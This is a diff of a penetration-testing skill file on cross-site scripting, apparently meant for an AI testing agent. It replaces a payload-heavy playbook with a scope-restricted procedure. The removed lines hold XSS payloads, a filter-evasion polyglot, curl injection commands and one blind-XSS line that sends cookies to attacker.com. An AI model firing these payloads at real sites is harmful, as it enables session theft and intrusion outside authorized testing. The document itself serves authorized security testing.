@@ -1,235 +1,55 @@
-# Cross-Site Scripting (XSS) — Playbook
+# Cross-Site Scripting (XSS)
 
-## Vulnerability Description
+Map procedures to the versioned WSTG and ASVS references in
+`skills/pentest/references/source-provenance.md`. Use a synthetic account and
+harmless marker input. Target requests and browser-driven checks must remain
+within the authorized, scope-enforcing runtime.
 
-**OWASP:** A03:2021 — Injection
-**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
+## Trace and validate
 
-Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper validation or escaping. An attacker can inject client-side scripts into pages viewed by other users, potentially stealing sessions, defacing sites, or redirecting users to malicious sites.
+For each input, trace `source → transformations → sanitizer/encoder → sink →
+browser context`. Record whether the context is HTML text, attribute, URL,
+JavaScript, CSS, or DOM API, and whether the transformation is context-appropriate.
+An input reflected in HTML or stored as text is not itself a vulnerability.
 
----
+- **Reflected:** use one inert marker in a synthetic request and inspect the
+  exact response context and browser interpretation.
+- **Stored:** submit from principal A to a disposable fixture, then load the
+  rendered content as principal B. Revalidate B's session before any sensitive
+  context. Remove the fixture through the approved workflow.
+- **DOM-based:** use the supported browser or supplied source to trace a
+  controllable source to a dangerous sink. If browser execution is unavailable,
+  report that as a capability limitation; source analysis alone remains a
+  candidate until behavior is observed.
+- **`postMessage` or cross-origin paths:** test only when that feature exists and
+  an authorized browser context can observe origin and message handling.
 
-## Types
-
-| Type | Description | Persistence | Common Vectors |
-|------|-------------|-------------|----------------|
-| **Reflected** | Payload is part of the request (e.g., URL parameter) and reflected immediately in the response | Non-persistent | Search boxes, error pages, URL params |
-| **Stored (persistent)** | Payload is saved on the server (e.g., comment, profile field) and served to all visitors | Persistent | User profiles, comments, reviews, feedback forms |
-| **DOM-based** | Vulnerability is in client-side JavaScript that reads attacker-controllable input (e.g., `location.hash`, `document.URL`) and writes it to the DOM | Non-persistent / Client-side | Hash fragments, `postMessage`, `document.referrer` |
-| **Blind XSS** | Payload executes in a different context than where it was injected (e.g., admin panel, log viewer) | Persistent | Contact forms, log viewers, admin dashboards |
-| **SVG/XML-based** | Malicious SVG or XML containing JavaScript event handlers | Persistent (if uploaded) | File uploads, avatars, SVG images |
-| **HTTP Header XSS** | Payload injected via HTTP headers (User-Agent, Referer, X-Forwarded-For) reflected in server logs or error pages | Non-persistent | Log viewers, analytics dashboards |
-| **Video/Media XSS** | XSS via video player metadata or subtitles | Persistent | Video upload, subtitle files |
-
----
-
-## Detection
-
-### Manual Payloads
-
-```html
-<!-- Basic script execution -->
-<script>alert(1)</script>
-
-<!-- HTML attribute injection -->
-"><img src=x onerror=alert(1)>
-'><img src=x onerror=alert(1)>
-"><script>alert(1)</script>
-
-<!-- SVG vector -->
-<svg onload=alert(1)>
-
-<!-- Event handlers (no script tags) -->
-<body onload=alert(1)>
-<img src=x onerror=alert(1)>
-<iframe onload=alert(1)>
-
-<!-- URL context -->
-javascript:alert(1)
-
-<!-- Bypassing filters with encoding / obfuscation -->
-<ScRiPt>alert(1)</sCrIpT>
-%3Cscript%3Ealert(1)%3C/script%3E
-&lt;script&gt;alert(1)&lt;/script&gt;
-
-<!-- Polyglot (works in multiple contexts) -->
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/ /* */oNcliCk=alert(1) )//%0D%0A%0D%0A//</stYle></titLe></teXtarEa></scRipt>--!>\x3csVg/<sVg/oNloAd=alert(1)>\x3e
-```
-
-### Testing Locations
-
-- URL query parameters (`?q=`, `?search=`, `?id=`)
-- Form input fields (search bars, comment boxes, profile fields)
-- URL path segments
-- HTTP headers (`User-Agent`, `Referer`, `Cookie`, `X-Forwarded-For`)
-- File upload filenames & file content (SVG, HTML, XML uploads)
-- `window.location.hash` / `document.URL` sinks (DOM-based)
-- JSON POST bodies (API endpoints)
-- Review/rating fields (stored XSS vectors)
-- Contact/feedback forms (blind XSS vectors — triggers in admin panel)
-- URL-valued fields in any form (avatar/image/link/website inputs):
-  `javascript:alert(1)`, `data:text/html,<script>…</script>`, and
-  `http://x/"><img src=x onerror=alert(1)>` — these are stored and render
-  in other users' contexts, so they double as blind vectors
-
-### Stored XSS Detection
-
-```bash
-# Test stored XSS via feedback/review forms.
-# A <script> tag is the cleanest proof of real script execution (strongest
-# PoC). Event-handler vectors (<img onerror=…>, <svg onload=…>) are valid
-# fallbacks for WAF/attribute-context cases; try whichever vector the sink
-# actually renders.
-curl -X POST http://<target>/api/Feedbacks \
-  -H "Content-Type: application/json" \
-  -d '{"comment":"<script>alert(document.domain)</script>","rating":1}'
-
-# Test stored XSS via profile fields (username, bio)
-curl -X PUT http://<target>/api/Users/1 \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer ***" \
-  -d '{"username":"<script>alert(1)</script>"}'
-```
-
-### Blind XSS Detection
-
-```bash
-# Inject into contact/feedback forms — check if admin panel renders it
-curl -X POST http://<target>/api/Complaints \
-  -H "Content-Type: application/json" \
-  -d '{"message":"<script>new Image().src=\"https://attacker.com/steal?cookie=\"+document.cookie</script>"}'
-
-# For blind XSS, use a collaborator/request-bin to detect callback
-```
-
-### SVG/XML XSS Detection
-
-```bash
-# Upload SVG with embedded XSS
-echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > payload.svg
-curl -X POST http://<target>/file-upload \
-  -F "file=@payload.svg"
-```
-
-### HTTP Header XSS Detection
-
-```bash
-# Inject XSS via headers
-curl -s -H "User-Agent: <script>alert(1)</script>" http://<target>/
-curl -s -H "Referer: <script>alert(1)</script>" http://<target>/
-curl -s -H "X-Forwarded-For: <script>alert(1)</script>" http://<target>/api/Users
-```
-
-### Tooling
-
-| Tool | Purpose |
-|---|---|
-| **dalfox** | Automated XSS scanning with parameter analysis |
-| **XSStrike** | Advanced XSS detection with WAF bypass capabilities |
-| **Browser DevTools** | Manual inspection of DOM sinks (`document.write`, `innerHTML`, `eval`, `location`) |
-| **Payload lists** | See below |
-
----
-
-## Payload Lists
-
-- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
-- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
-
----
-
-## Internet Research
-
-- `<product> XSS exploit`
-- `<CVE-ID> xss PoC`
-- `site:hackerone.com cross-site scripting`
-- `site:portswigger.net XSS`
-- `<product> XSS bypass WAF`
-
----
-
-## Safe Proof of Concept
-
-Use `alert(document.domain)` to prove execution without causing harm:
-
-```html
-<!-- Non-destructive proof of concept -->
-<script>alert(document.domain)</script>
-"><img src=x onerror=alert(document.domain)>
-<svg onload=alert(document.domain)>
-```
-
-Safe PoC rules:
-- Use `alert()` with a static string or `document.domain` — no session data.
-- For stored XSS, remove the payload immediately after demonstrating it.
-- For reflected XSS, the payload only affects the tester.
-- Never use payloads that make HTTP requests to third-party domains.
-
----
+Use a harmless, self-contained execution marker only in an isolated page and
+synthetic account. Do not access cookies, local storage, credentials, or browser
+data; do not make external callbacks. A reportable proof identifies the
+untrusted input, context, unsafe transformation/sink, principal viewing it, and
+the observed browser-side effect. CSP or a scanner result alone is not proof.
 
 ## Evidence
 
-Each finding should include:
-
-```
-**Vulnerability:** Cross-Site Scripting (Reflected)
-**URL:** https://target.com/search?q=test
-**Parameter:** q
-**Payload:** <script>alert(document.domain)</script>
-**Type:** Reflected XSS
-
-**HTTP Request:**
-  GET /search?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
-  Host: target.com
-
-**HTTP Response (snippet):**
-  <div class="results">
-    You searched for: <script>alert(document.domain)</script>
-  </div>
-
-**Browser behavior:** alert box showing "target.com"
-**Remediation:** Encode output using context-appropriate escaping
-```
-
----
-
-## Evidence to Save
-
-- Tool output → `$ENG_DIR/evidence/exploitation/xss/<finding>.*`
-- Screenshots (if applicable) → `$ENG_DIR/evidence/exploitation/screenshots/`
-- Request/response pairs → `$ENG_DIR/evidence/exploitation/http/`
-
----
+Save exact input and response, the relevant encoded/rendered context, source and
+revision when available, browser screenshot or execution observation, synthetic
+principal/fixture, cleanup, guard receipts, and limits under
+`$ENG_DIR/evidence/exploitation/xss/`. Redact unrelated data.
 
 ## Stop Conditions
-- Generic baseline — see `skills/pentest/references/shared-safety.md` §Generic Stop Conditions (pause on unexpected behavior, scope breach, or WAF/IDS trip).
 
----
-
-## Remediation
-
-| Measure | Description |
-|---|---|
-| **Output encoding / escaping** | Encode data before rendering in HTML, attribute, JavaScript, CSS, and URL contexts. Use context-specific encoders (e.g., HTML entity encode for HTML body, backslash escape for JS strings). |
-| **Content Security Policy (CSP)** | Restrict allowed script sources via `Content-Security-Policy` headers. Use nonces or hashes for inline scripts. |
-| **Input validation** | Server-side validation to reject or sanitize dangerous characters. Whitelist allowed patterns where possible. |
-| **HttpOnly cookies** | Mark session cookies as `HttpOnly` to prevent JavaScript access. Does not prevent XSS but limits session theft. |
-| **Trusted types** | Enforce Trusted Types in CSP to prevent DOM XSS by restricting dangerous assignment sinks. |
-| **Sanitization** | Use a DOMPurify-like library to strip executable content from user-controlled HTML. |
-
----
+- Stop if a real user's context would render the content or if the test could
+  persist beyond the synthetic fixture.
+- Stop if any real credential, session data, or unrelated personal information
+  appears.
+- Stop when browser execution or the rendering context cannot be observed; keep
+  the result as a candidate and report the limitation.
 
 ## Blocked Actions
 
-The following are **never** permitted during authorized testing unless explicitly approved in writing:
-
-| Action | Risk |
-|---|---|
-| **Stored XSS persisting beyond test session** | Affects real users after testing ends — must be cleaned up immediately |
-| **Session-stealing payloads** | `document.cookie` exfiltration, `fetch` to attacker-controlled servers |
-| **Cookie exfiltration** | Compromising user sessions |
-| **Keylogging payloads** | Capturing user credentials |
-| **Phishing overlays** | Fake login forms injected via XSS |
-| **Self-XSS without chaining** | Low-severity finding — don't report unless it can be chained |
-| Payloads that exfiltrate to external hosts | Requires attacker-controlled infrastructure; data leakage |
----
+- Credential/session theft, cookie or storage reads, keylogging, phishing UI,
+  external callbacks, blind payloads that target administrators, or persistence
+  in real user content.
+- WAF/filter evasion payload catalogs, unbounded fuzzing, or claims based only
+  on reflected text, source patterns, response status, or scanner output.
